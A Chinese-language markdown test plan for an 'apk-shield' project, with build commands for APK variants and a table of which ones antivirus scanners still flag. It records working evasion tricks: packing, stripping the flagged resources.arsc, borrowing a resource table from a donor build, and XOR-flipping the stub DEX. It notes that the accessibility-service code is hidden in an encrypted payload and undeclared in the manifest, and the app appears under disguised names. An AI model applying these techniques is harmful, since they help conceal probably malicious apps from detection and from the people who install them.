# 安装测试套件 v2

资源表概念：**[RESOURCES_ARSC.md](./RESOURCES_ARSC.md)** · arsc 结论：**[ARSC_SCAN_REPORT.md](./ARSC_SCAN_REPORT.md)**

| 段 | # | 说明 |
|----|---|------|
| 基线 | 1–2 | 原包 / #90 |
| 加壳 | 3 | 91 全资源 |
| 样本 arsc 归因 | 4–12 | 已测完（见日志） |
| **无样本 arsc** | **13–17** | 扫描 vs 功能折中 |
| **新 arsc** | **16** | 需 `input/donor-arsc-source.apk`，**无则跳过** |
| **加壳+DEX 翻转** | **19–21** | stub `classes.dex` 末字节 XOR，对照 3/14/15 |

---

## 13 起（默认不加 5412ce7f 的 arsc）

| # | 构造 | 测试用途 |
|---|------|----------|
| **13** | 2 + 名 + **res+assets+lib**（←91），**无 arsc** | 原包线「尽量满资源」但避开毒 arsc；**963 个 res 文件**；**功能需实机** |
| **14** | 加壳 91 **删除 resources.arsc** | 加壳仍保留 payload/res 等 |
| **15** | 加壳 **56 瘦包** | 无 arsc/res/业务 assets |
| **16** | 2 + arsc **仅**来自 **donor-arsc-source.apk** | Telegram/Gradle **新构建**；验证新表是否不报 |
| **17** | 2 + **assets+lib**（无 arsc、无 res） | 比 2 多 so/业务包，仍无资源表 |

```bash
cd apk-shield
python3 build_install_suite.py 13 14 15 17
# 放入 input/donor-arsc-source.apk 后：
python3 build_install_suite.py 16
```

**16 准备方式**：用管理后台/Telegram 构建一条（新应用名、新图标、新 applicationId），把产出 APK 复制为 `apk-shield/input/donor-arsc-source.apk`（不要再用 5412ce7f）。

### 19–21 加壳 + stub DEX「反转」（对照 3 / 14 / 15）

| # | 基座 | 变化 | 测什么 |
|---|------|------|--------|
| **19** | 91 全资源（含 arsc） | stub DEX 翻转 | **已测：仍报毒**（有 arsc 时翻转无效） |
| **20** | 14（无 arsc） | stub DEX 翻转 | **已测：正常**；包名 **org.helper.scannertask** |
| **21** | 15（56 瘦） | stub DEX 翻转 | **已测：正常** |

**20/21 不是换包名**：与 14/15 同为 `shield_minimal` → Manifest **无 uses-permission、无无障碍 Service 声明**（代码在加密 payload 里）。界面像「别的 App」常因 **无 resources.arsc**，列表名/图标与 **3/19（Rivo TV）** 不一致。

```bash
python3 build_install_suite.py 19 20 21
```

---

---

## 1–12 摘要

见 [INSTALL_TEST_LOG.md](./INSTALL_TEST_LOG.md)（**6 样本 arsc 报**；**10/11 仍报**；**12 解析失败**；**5/7/8 不报**）。
